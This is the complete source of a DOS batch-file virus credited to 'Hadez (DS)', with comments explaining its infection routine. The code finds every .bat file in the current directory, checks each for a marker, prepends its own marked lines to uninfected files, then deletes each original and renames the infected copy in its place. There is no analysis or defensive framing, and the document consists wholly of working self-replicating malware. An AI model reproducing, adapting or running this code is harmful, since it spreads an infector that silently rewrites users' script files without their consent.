@ECHO OFF %Hd%
REM  Created by Hadez (DS)
REM  Creates temp file which will be the infector
Find "Hq" <%0.bat >> Hd.bat
For  %%f in (*.bat) do Call Hd %0.bat %%f
DEL  HD.bat
GOTO Hd

REM  Infection routine All this routine should have the second flag
REM  Receives the host's name and the file to infect as parameter
Find "Hd" %2 > NUL %Hq%
IF   NOT ERRORLEVEL 1 GOTO Quit %HdHq%
Find "Hd" %1 >> Temp.bat %Hq%
Type %2 >> Temp.bat %HqHd%
DEL  %2 %HqHd%
RENAME Temp.bat %2 %HqHd%
:Quit%HqHd%
 
REM  The Host's code will be in here!
:Hd
ECHO ON %Hd%

